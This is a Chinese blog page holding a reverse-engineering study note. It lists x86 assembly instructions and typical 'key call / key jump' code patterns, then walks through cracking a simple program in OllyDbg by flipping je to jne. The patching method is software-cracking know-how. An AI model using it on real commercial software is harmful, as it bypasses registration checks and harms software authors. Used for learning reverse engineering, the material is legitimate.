<!DOCTYPE html>
<html lang="zh-cn">
<head>
  <meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=2">
<meta name="theme-color" content="#222">
<meta name="generator" content="Hexo 6.0.0">
  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png">
  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png">
  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png">
  <link rel="mask-icon" href="/images/logo.svg" color="#222">

<link rel="stylesheet" href="/css/main.css">


<link rel="stylesheet" href="/lib/font-awesome/css/all.min.css">

<script id="hexo-configurations">
    var NexT = window.NexT || {};
    var CONFIG = {"hostname":"wanheiqiyihu.top","root":"/","scheme":"Pisces","version":"7.8.0","exturl":false,"sidebar":{"position":"left","display":"post","padding":18,"offset":12,"onmobile":false},"copycode":{"enable":false,"show_result":false,"style":null},"back2top":{"enable":true,"sidebar":false,"scrollpercent":false},"bookmark":{"enable":false,"color":"#222","save":"auto"},"fancybox":false,"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"algolia":{"hits":{"per_page":10},"labels":{"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}},"localsearch":{"enable":true,"trigger":"auto","top_n_per_article":1,"unescape":false,"preload":false},"motion":{"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}},"path":"search.xml"};
  </script>

  <meta name="description" content="潜心学习，不骄不躁">
<meta property="og:type" content="website">
<meta property="og:title" content="十三の博客">
<meta property="og:url" content="https://wanheiqiyihu.top/page/37/index.html">
<meta property="og:site_name" content="十三の博客">
<meta property="og:description" content="潜心学习，不骄不躁">
<meta property="og:locale" content="zh_CN">
<meta property="article:author" content="十三">
<meta name="twitter:card" content="summary">

<link rel="canonical" href="https://wanheiqiyihu.top/page/37/">


<script id="page-configurations">
  // https://hexo.io/docs/variables.html
  CONFIG.page = {
    sidebar: "",
    isHome : true,
    isPost : false,
    lang   : 'zh-cn'
  };
</script>

  <title>十三の博客</title>
  






  <noscript>
  <style>
  .use-motion .brand,
  .use-motion .menu-item,
  .sidebar-inner,
  .use-motion .post-block,
  .use-motion .pagination,
  .use-motion .comments,
  .use-motion .post-header,
  .use-motion .post-body,
  .use-motion .collection-header { opacity: initial; }

  .use-motion .site-title,
  .use-motion .site-subtitle {
    opacity: initial;
    top: initial;
  }

  .use-motion .logo-line-before i { left: initial; }
  .use-motion .logo-line-after i { right: initial; }
  </style>
</noscript>

</head>

<body itemscope itemtype="http://schema.org/WebPage">
  <div class="container use-motion">
    <div class="headband"></div>

    <header class="header" itemscope itemtype="http://schema.org/WPHeader">
      <div class="header-inner"><div class="site-brand-container">
  <div class="site-nav-toggle">
    <div class="toggle" aria-label="切换导航栏">
      <span class="toggle-line toggle-line-first"></span>
      <span class="toggle-line toggle-line-middle"></span>
      <span class="toggle-line toggle-line-last"></span>
    </div>
  </div>

  <div class="site-meta">

    <a href="/" class="brand" rel="start">
      <span class="logo-line-before"><i></i></span>
      <h1 class="site-title">十三の博客</h1>
      <span class="logo-line-after"><i></i></span>
    </a>
  </div>

  <div class="site-nav-right">
    <div class="toggle popup-trigger">
        <i class="fa fa-search fa-fw fa-lg"></i>
    </div>
  </div>
</div>




<nav class="site-nav">
  <ul id="menu" class="main-menu menu">
        <li class="menu-item menu-item-home">

    <a href="/" rel="section"><i class="fa fa-home fa-fw"></i>首页</a>

  </li>
        <li class="menu-item menu-item-archives">

    <a href="/archives/" rel="section"><i class="fa fa-archive fa-fw"></i>归档</a>

  </li>
        <li class="menu-item menu-item-ctf做题笔记">

    <a href="/categories/Experience" rel="section"><i class="download fa-fw"></i>CTF做题笔记</a>

  </li>
        <li class="menu-item menu-item-python">

    <a href="/categories/python" rel="section"><i class="download fa-fw"></i>python</a>

  </li>
        <li class="menu-item menu-item-java">

    <a href="/categories/java" rel="section"><i class="download fa-fw"></i>java</a>

  </li>
        <li class="menu-item menu-item-读书笔记">

    <a href="/categories/readbook" rel="section"><i class="download fa-fw"></i>读书笔记</a>

  </li>
        <li class="menu-item menu-item-渗透测试">

    <a href="/categories/penetration" rel="section"><i class="download fa-fw"></i>渗透测试</a>

  </li>
        <li class="menu-item menu-item-基础">

    <a href="/categories/basic" rel="section"><i class="download fa-fw"></i>基础</a>

  </li>
        <li class="menu-item menu-item-轮子">

    <a href="/categories/lunzi" rel="section"><i class="download fa-fw"></i>轮子</a>

  </li>
        <li class="menu-item menu-item-漏洞库">

    <a href="/categories/fuxian" rel="section"><i class="download fa-fw"></i>漏洞库</a>

  </li>
        <li class="menu-item menu-item-工具">

    <a href="/categories/tools" rel="section"><i class="download fa-fw"></i>工具</a>

  </li>
        <li class="menu-item menu-item-代码审计">

    <a href="/categories/daima" rel="section"><i class="download fa-fw"></i>代码审计</a>

  </li>
        <li class="menu-item menu-item-逆向">

    <a href="/categories/nixiang" rel="section"><i class="download fa-fw"></i>逆向</a>

  </li>
        <li class="menu-item menu-item-应急响应">

    <a href="/categories/yingji" rel="section"><i class="download fa-fw"></i>应急响应</a>

  </li>
        <li class="menu-item menu-item-免杀">

    <a href="/categories/miansha" rel="section"><i class="download fa-fw"></i>免杀</a>

  </li>
        <li class="menu-item menu-item-靶场">

    <a href="/categories/bachang" rel="section"><i class="download fa-fw"></i>靶场</a>

  </li>
        <li class="menu-item menu-item-cve申请">

    <a href="/categories/cve" rel="section"><i class="download fa-fw"></i>cve申请</a>

  </li>
        <li class="menu-item menu-item-c语言">

    <a href="/categories/c" rel="section"><i class="download fa-fw"></i>c语言</a>

  </li>
      <li class="menu-item menu-item-search">
        <a role="button" class="popup-trigger"><i class="fa fa-search fa-fw"></i>搜索
        </a>
      </li>
  </ul>
</nav>



  <div class="search-pop-overlay">
    <div class="popup search-popup">
        <div class="search-header">
  <span class="search-icon">
    <i class="fa fa-search"></i>
  </span>
  <div class="search-input-container">
    <input autocomplete="off" autocapitalize="off"
           placeholder="搜索..." spellcheck="false"
           type="search" class="search-input">
  </div>
  <span class="popup-btn-close">
    <i class="fa fa-times-circle"></i>
  </span>
</div>
<div id="search-result">
  <div id="no-result">
    <i class="fa fa-spinner fa-pulse fa-5x fa-fw"></i>
  </div>
</div>

    </div>
  </div>

</div>
    </header>

    
  <div class="back-to-top">
    <i class="fa fa-arrow-up"></i>
    <span>0%</span>
  </div>


    <main class="main">
      <div class="main-inner">
        <div class="content-wrap">
          

          <div class="content index posts-expand">
            
      
  
  
  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-cn">
    <link itemprop="mainEntityOfPage" href="https://wanheiqiyihu.top/2022/09/05/%E9%80%86%E5%90%91%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B01-%E6%9F%90%E7%88%B1%E6%8A%80%E6%9C%AF%E5%90%A7%E7%9A%84vip%E5%9F%BA%E7%A1%80%E6%95%99%E7%A8%8B/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/avatar.gif">
      <meta itemprop="name" content="十三">
      <meta itemprop="description" content="潜心学习，不骄不躁">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="十三の博客">
    </span>
      <header class="post-header">
        <h2 class="post-title" itemprop="name headline">
          
            <a href="/2022/09/05/%E9%80%86%E5%90%91%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B01-%E6%9F%90%E7%88%B1%E6%8A%80%E6%9C%AF%E5%90%A7%E7%9A%84vip%E5%9F%BA%E7%A1%80%E6%95%99%E7%A8%8B/" class="post-title-link" itemprop="url">逆向学习笔记1（某爱技术吧的vip基础教程</a>
        </h2>

        <div class="post-meta">
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-calendar"></i>
              </span>
              <span class="post-meta-item-text">发表于</span>
              

              <time title="创建时间：2022-09-05 22:11:26 / 修改时间：22:17:42" itemprop="dateCreated datePublished" datetime="2022-09-05T22:11:26+08:00">2022-09-05</time>
            </span>
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-folder"></i>
              </span>
              <span class="post-meta-item-text">分类于</span>
                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
                  <a href="/categories/nixiang/" itemprop="url" rel="index"><span itemprop="name">-nixiang</span></a>
                </span>
            </span>

          

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">

      
          <h1 id="逆向学习笔记1（某爱技术吧的vip基础教程"><a href="#逆向学习笔记1（某爱技术吧的vip基础教程" class="headerlink" title="逆向学习笔记1（某爱技术吧的vip基础教程"></a>逆向学习笔记1（某爱技术吧的vip基础教程</h1><p>某爱技术吧的vip基础教程</p>
<h1 id="常用汇编指令"><a href="#常用汇编指令" class="headerlink" title="常用汇编指令"></a>常用汇编指令</h1><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br><span class="line">230</span><br><span class="line">231</span><br><span class="line">232</span><br><span class="line">233</span><br><span class="line">234</span><br><span class="line">235</span><br><span class="line">236</span><br><span class="line">237</span><br><span class="line">238</span><br><span class="line">239</span><br><span class="line">240</span><br><span class="line">241</span><br><span class="line">242</span><br></pre></td><td class="code"><pre><span class="line">6.常用汇编指令的认识</span><br><span class="line">                  软件破解常用汇编指令 </span><br><span class="line"></span><br><span class="line">   cmp    a,b     //  比较a与b</span><br><span class="line">   mov    a,b     //  把b值送给a值，使a=b</span><br><span class="line">   ret            //  返回主程序</span><br><span class="line">   nop            //  无作用</span><br><span class="line">   call           //  调用子程序，子程序以ret结尾</span><br><span class="line">   je或jz         //  相等则跳（机器码是74或84）</span><br><span class="line">   jne或jnz       //  不相等则跳（机器码是75或85）</span><br><span class="line">   jmp            //  无条件跳（机器码是EB）</span><br><span class="line">   jb             //  若小于则跳</span><br><span class="line">   ja             //  若大于则跳</span><br><span class="line">   jg             //  若大于则跳</span><br><span class="line">   jge            //  若大于等于则跳</span><br><span class="line">   jl             //  若小于则跳</span><br><span class="line">   pop xxx        //  xxx出栈</span><br><span class="line">   push xxx       //  xxx压栈</span><br><span class="line">		★★破解经典句式★★</span><br><span class="line">1.(最常用)</span><br><span class="line">    mov  eax [      ]</span><br><span class="line">    mov  edx [      ] </span><br><span class="line">    call 00??????       关键call</span><br><span class="line">    test eax eax     </span><br><span class="line">    jz(jnz)或  jne(je)  关键跳转</span><br><span class="line">2 (最常用)</span><br><span class="line">    mov  eax [      ]</span><br><span class="line">    mov  edx [      ]</span><br><span class="line">    call 00??????       关键call</span><br><span class="line">    jne(je)             关键跳转</span><br><span class="line">3</span><br><span class="line">  mov eax [  ]</span><br><span class="line">  mov edx [  ]</span><br><span class="line">  cmp eax,edx</span><br><span class="line">  jnz(jz)</span><br><span class="line">4</span><br><span class="line">    lea edi [    ]</span><br><span class="line">    lea esi [    ]</span><br><span class="line">    repz cmpsd</span><br><span class="line">    jz(jnz)</span><br><span class="line">5</span><br><span class="line">    mov  eax [      ]</span><br><span class="line">    mov  edx [      ]</span><br><span class="line">    call 00??????</span><br><span class="line">    setz (setnz) al (bl,cl…)</span><br><span class="line">6</span><br><span class="line">    mov  eax [      ] </span><br><span class="line">    mov  edx [      ] </span><br><span class="line">    call 00??????</span><br><span class="line">    test eax eax</span><br><span class="line">    setz (setnz) bl,cl…</span><br><span class="line">7</span><br><span class="line">    call 00??????  ***</span><br><span class="line">    push eax (ebx,ecx…)</span><br><span class="line">    ……</span><br><span class="line">    ……</span><br><span class="line">    call 00??????</span><br><span class="line">    pop eax (ebx,ecx…)</span><br><span class="line">    test eax eax</span><br><span class="line">    jz(jnz)</span><br><span class="line">一、数据传输指令 </span><br><span class="line">─────────────────────────────────────── </span><br><span class="line">    它们在存贮器和寄存器、寄存器和输入输出端口之间传送数据. </span><br><span class="line">    1. 通用数据传送指令. </span><br><span class="line">        MOV    传送字或字节. </span><br><span class="line">        MOVSX  先符号扩展,再传送. </span><br><span class="line">        MOVZX  先零扩展,再传送. </span><br><span class="line">        PUSH    把字压入堆栈. </span><br><span class="line">        POP    把字弹出堆栈. </span><br><span class="line">        PUSHA  把AX,CX,DX,BX,SP,BP,SI,DI依次压入堆栈. </span><br><span class="line">        POPA    把DI,SI,BP,SP,BX,DX,CX,AX依次弹出堆栈. </span><br><span class="line">        PUSHAD  把EAX,ECX,EDX,EBX,ESP,EBP,ESI,EDI依次压入堆栈. </span><br><span class="line">        POPAD  把EDI,ESI,EBP,ESP,EBX,EDX,ECX,EAX依次弹出堆栈. </span><br><span class="line">        BSWAP  交换32位寄存器里字节的顺序 </span><br><span class="line">        XCHG    交换字或字节.( 至少有一个操作数为寄存器,段寄存器不可作为操作数) </span><br><span class="line">        CMPXCHG 比较并交换操作数.( 第二个操作数必须为累加器AL/AX/EAX ) </span><br><span class="line">        XADD    先交换再累加.( 结果在第一个操作数里 ) </span><br><span class="line">        XLAT    字节查表转换. </span><br><span class="line">                ── BX 指向一张 256 字节的表的起点, AL 为表的索引值 (0-255,即 </span><br><span class="line">                0-FFH); 返回 AL 为查表结果. ( [BX+AL]-&gt;AL ) </span><br><span class="line">    2. 输入输出端口传送指令. </span><br><span class="line">        IN      I/O端口输入. ( 语法: IN 累加器, &#123;端口号│DX&#125; ) </span><br><span class="line">        OUT    I/O端口输出. ( 语法: OUT &#123;端口号│DX&#125;,累加器 ) </span><br><span class="line">          输入输出端口由立即方式指定时, 其范围是 0-255; 由寄存器 DX 指定时, </span><br><span class="line">          其范围是 0-65535. </span><br><span class="line">    3. 目的地址传送指令. </span><br><span class="line">        LEA    装入有效地址. </span><br><span class="line">          例: LEA DX,string  ;把偏移地址存到DX. </span><br><span class="line">        LDS    传送目标指针,把指针内容装入DS. </span><br><span class="line">          例: LDS SI,string  ;把段地址:偏移地址存到DS:SI. </span><br><span class="line">        LES    传送目标指针,把指针内容装入ES. </span><br><span class="line">          例: LES DI,string  ;把段地址:偏移地址存到ES:DI. </span><br><span class="line">        LFS    传送目标指针,把指针内容装入FS. </span><br><span class="line">          例: LFS DI,string  ;把段地址:偏移地址存到FS:DI. </span><br><span class="line">        LGS    传送目标指针,把指针内容装入GS. </span><br><span class="line">          例: LGS DI,string  ;把段地址:偏移地址存到GS:DI. </span><br><span class="line">        LSS    传送目标指针,把指针内容装入SS. </span><br><span class="line">          例: LSS DI,string  ;把段地址:偏移地址存到SS:DI. </span><br><span class="line">    4. 标志传送指令. </span><br><span class="line">        LAHF    标志寄存器传送,把标志装入AH. </span><br><span class="line">        SAHF    标志寄存器传送,把AH内容装入标志寄存器. </span><br><span class="line">        PUSHF  标志入栈. </span><br><span class="line">        POPF    标志出栈. </span><br><span class="line">        PUSHD  32位标志入栈. </span><br><span class="line">        POPD    32位标志出栈. </span><br><span class="line"></span><br><span class="line">二、算术运算指令 </span><br><span class="line">─────────────────────────────────────── </span><br><span class="line">        　　ADD    加法. </span><br><span class="line">        ADC    带进位加法. </span><br><span class="line">        INC    加 1. </span><br><span class="line">        AAA    加法的ASCII码调整. </span><br><span class="line">        DAA    加法的十进制调整. </span><br><span class="line">        SUB    减法. </span><br><span class="line">        SBB    带借位减法. </span><br><span class="line">        DEC    减 1. </span><br><span class="line">        NEC    求反(以 0 减之). </span><br><span class="line">        CMP    比较.(两操作数作减法,仅修改标志位,不回送结果). </span><br><span class="line">        AAS    减法的ASCII码调整. </span><br><span class="line">        DAS    减法的十进制调整. </span><br><span class="line">        MUL    无符号乘法. </span><br><span class="line">        IMUL    整数乘法. </span><br><span class="line">          以上两条,结果回送AH和AL(字节运算),或DX和AX(字运算), </span><br><span class="line">        AAM    乘法的ASCII码调整. </span><br><span class="line">        DIV    无符号除法. </span><br><span class="line">        IDIV    整数除法. </span><br><span class="line">          以上两条,结果回送: </span><br><span class="line">              商回送AL,余数回送AH, (字节运算); </span><br><span class="line">          或  商回送AX,余数回送DX, (字运算). </span><br><span class="line">        AAD    除法的ASCII码调整. </span><br><span class="line">        CBW    字节转换为字. (把AL中字节的符号扩展到AH中去) </span><br><span class="line">        CWD    字转换为双字. (把AX中的字的符号扩展到DX中去) </span><br><span class="line">        CWDE    字转换为双字. (把AX中的字符号扩展到EAX中去) </span><br><span class="line">        CDQ    双字扩展.    (把EAX中的字的符号扩展到EDX中去) </span><br><span class="line"></span><br><span class="line">三、逻辑运算指令 </span><br><span class="line">─────────────────────────────────────── </span><br><span class="line">        　　AND    与运算. </span><br><span class="line">        OR      或运算. </span><br><span class="line">        XOR    异或运算. </span><br><span class="line">        NOT    取反. </span><br><span class="line">        TEST    测试.(两操作数作与运算,仅修改标志位,不回送结果). </span><br><span class="line">        SHL    逻辑左移. </span><br><span class="line">        SAL    算术左移.(=SHL) </span><br><span class="line">        SHR    逻辑右移. </span><br><span class="line">        SAR    算术右移.(=SHR) </span><br><span class="line">        ROL    循环左移. </span><br><span class="line">        ROR    循环右移. </span><br><span class="line">        RCL    通过进位的循环左移. </span><br><span class="line">        RCR    通过进位的循环右移. </span><br><span class="line">          以上八种移位指令,其移位次数可达255次. </span><br><span class="line">              移位一次时, 可直接用操作码.  如 SHL AX,1. </span><br><span class="line">              移位&gt;1次时, 则由寄存器CL给出移位次数. </span><br><span class="line">                如  MOV CL,04 </span><br><span class="line">                    SHL AX,CL </span><br><span class="line"></span><br><span class="line">四、串指令 </span><br><span class="line">─────────────────────────────────────── </span><br><span class="line">            　DS:SI  源串段寄存器  :源串变址. </span><br><span class="line">            ES:DI  目标串段寄存器:目标串变址. </span><br><span class="line">            CX      重复次数计数器. </span><br><span class="line">            AL/AX  扫描值. </span><br><span class="line">            D标志  0表示重复操作中SI和DI应自动增量; 1表示应自动减量. </span><br><span class="line">            Z标志  用来控制扫描或比较操作的结束. </span><br><span class="line">        MOVS    串传送. </span><br><span class="line">            ( MOVSB  传送字符.    MOVSW  传送字.    MOVSD  传送双字. ) </span><br><span class="line">        CMPS    串比较. </span><br><span class="line">            ( CMPSB  比较字符.    CMPSW  比较字. ) </span><br><span class="line">        SCAS    串扫描. </span><br><span class="line">            把AL或AX的内容与目标串作比较,比较结果反映在标志位. </span><br><span class="line">        LODS    装入串. </span><br><span class="line">            把源串中的元素(字或字节)逐一装入AL或AX中. </span><br><span class="line">            ( LODSB  传送字符.    LODSW  传送字.    LODSD  传送双字. ) </span><br><span class="line">        STOS    保存串. </span><br><span class="line">            是LODS的逆过程. </span><br><span class="line">        REP            当CX/ECX&lt;&gt;0时重复. </span><br><span class="line">        REPE/REPZ      当ZF=1或比较结果相等,且CX/ECX&lt;&gt;0时重复. </span><br><span class="line">        REPNE/REPNZ    当ZF=0或比较结果不相等,且CX/ECX&lt;&gt;0时重复. </span><br><span class="line">        REPC          当CF=1且CX/ECX&lt;&gt;0时重复. </span><br><span class="line">        REPNC          当CF=0且CX/ECX&lt;&gt;0时重复. </span><br><span class="line"></span><br><span class="line">五、程序转移指令 </span><br><span class="line">─────────────────────────────────────── </span><br><span class="line">    　1&gt;无条件转移指令 (长转移) </span><br><span class="line">        JMP    无条件转移指令 </span><br><span class="line">        CALL    过程调用 </span><br><span class="line">        RET/RETF过程返回. </span><br><span class="line">    2&gt;条件转移指令 (短转移,-128到+127的距离内) </span><br><span class="line">        ( 当且仅当(SF XOR OF)=1时,OP1&lt;OP2 ) </span><br><span class="line">        JA/JNBE 不小于或不等于时转移. </span><br><span class="line">        JAE/JNB 大于或等于转移. </span><br><span class="line">        JB/JNAE 小于转移. </span><br><span class="line">        JBE/JNA 小于或等于转移. </span><br><span class="line">          以上四条,测试无符号整数运算的结果(标志C和Z). </span><br><span class="line">        JG/JNLE 大于转移. </span><br><span class="line">        JGE/JNL 大于或等于转移. </span><br><span class="line">        JL/JNGE 小于转移. </span><br><span class="line">        JLE/JNG 小于或等于转移. </span><br><span class="line">          以上四条,测试带符号整数运算的结果(标志S,O和Z). </span><br><span class="line">        JE/JZ  等于转移. </span><br><span class="line">        JNE/JNZ 不等于时转移. </span><br><span class="line">        JC      有进位时转移. </span><br><span class="line">        JNC    无进位时转移. </span><br><span class="line">        JNO    不溢出时转移. </span><br><span class="line">        JNP/JPO 奇偶性为奇数时转移. </span><br><span class="line">        JNS    符号位为 &quot;0&quot; 时转移. </span><br><span class="line">        JO      溢出转移. </span><br><span class="line">        JP/JPE  奇偶性为偶数时转移. </span><br><span class="line">        JS      符号位为 &quot;1&quot; 时转移. </span><br><span class="line">    3&gt;循环控制指令(短转移) </span><br><span class="line">        LOOP            CX不为零时循环. </span><br><span class="line">        LOOPE/LOOPZ    CX不为零且标志Z=1时循环. </span><br><span class="line">        LOOPNE/LOOPNZ  CX不为零且标志Z=0时循环. </span><br><span class="line">        JCXZ            CX为零时转移. </span><br><span class="line">        JECXZ          ECX为零时转移. </span><br><span class="line">    4&gt;中断指令 </span><br><span class="line">        INT    中断指令 </span><br><span class="line">        INTO    溢出中断 </span><br><span class="line">        IRET    中断返回 </span><br><span class="line">    5&gt;处理器控制指令 </span><br><span class="line">        HLT    处理器暂停, 直到出现中断或复位信号才继续. </span><br><span class="line">        WAIT    当芯片引线TEST为高电平时使CPU进入等待状态. </span><br><span class="line">        ESC    转换到外处理器. </span><br><span class="line">        LOCK    封锁总线. </span><br><span class="line">        NOP    空操作. </span><br><span class="line">        STC    置进位标志位. </span><br><span class="line">        CLC    清进位标志位. </span><br><span class="line">        CMC    进位标志取反. </span><br><span class="line">        STD    置方向标志位. </span><br><span class="line">        CLD    清方向标志位. </span><br><span class="line">        STI    置中断允许位. </span><br><span class="line">        CLI    清中断允许位. </span><br><span class="line"></span><br><span class="line">六、伪指令 </span><br><span class="line">─────────────────────────────────────── </span><br><span class="line">        　　DW      定义字(2字节). </span><br><span class="line">        PROC    定义过程. </span><br><span class="line">        ENDP    过程结束. </span><br><span class="line">        SEGMENT 定义段. </span><br><span class="line">        ASSUME  建立段寄存器寻址. </span><br><span class="line">        ENDS    段结束. </span><br><span class="line">        END    程序结束. </span><br></pre></td></tr></table></figure>



<h1 id="破解第一个简单的程序"><a href="#破解第一个简单的程序" class="headerlink" title="破解第一个简单的程序"></a>破解第一个简单的程序</h1><p>就是一个简单的易语言工具</p>
<p>基本破解的四个步骤，但这个课程看着就很老了，笔者只是学一学看看，毕竟也是经典课程。</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">1.查壳</span><br><span class="line"></span><br><span class="line">2.寻找关键字或断点（使用中文搜索引擎或者）</span><br><span class="line"></span><br><span class="line">3.找到关键跳转或者关键call</span><br><span class="line"></span><br><span class="line">4.修改达到破解的目的</span><br><span class="line"></span><br><span class="line">ctrl+g     输入00401000来到程序的入口点（所有exe程序的入口点）</span><br><span class="line"></span><br><span class="line">ctrl+f     输入要查找的信息</span><br></pre></td></tr></table></figure>

<p>小知识</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">汇编jmp 就是无条件跳转</span><br><span class="line">od下断点 可以右键 可以f2</span><br><span class="line">je 大概是关键跳转的意思</span><br><span class="line">od工具 f9是运行程序</span><br><span class="line">od工具 f8是单步往下走</span><br><span class="line">关键跳转步骤的时候可以试一下，je改成jne，jne改成je，jz就改成jnz，jnz就改成jz</span><br><span class="line">右键</span><br></pre></td></tr></table></figure>

<p><img src="/2022/09/05/%E9%80%86%E5%90%91%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B01-%E6%9F%90%E7%88%B1%E6%8A%80%E6%9C%AF%E5%90%A7%E7%9A%84vip%E5%9F%BA%E7%A1%80%E6%95%99%E7%A8%8B/image-20220905110245394.png" alt="image-20220905110245394"></p>
<p>这个大于号是有跳转跳转进来的意思，红色的线就是会跳转的，灰色的线就是不会跳转的</p>
<p>这个程序这里就是关键跳转步骤，输入正确就不会跳转，输入错误就会跳转</p>
<p><img src="/2022/09/05/%E9%80%86%E5%90%91%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B01-%E6%9F%90%E7%88%B1%E6%8A%80%E6%9C%AF%E5%90%A7%E7%9A%84vip%E5%9F%BA%E7%A1%80%E6%95%99%E7%A8%8B/image-20220905140633949.png" alt="image-20220905140633949"></p>
<p>我们把他改成jne</p>
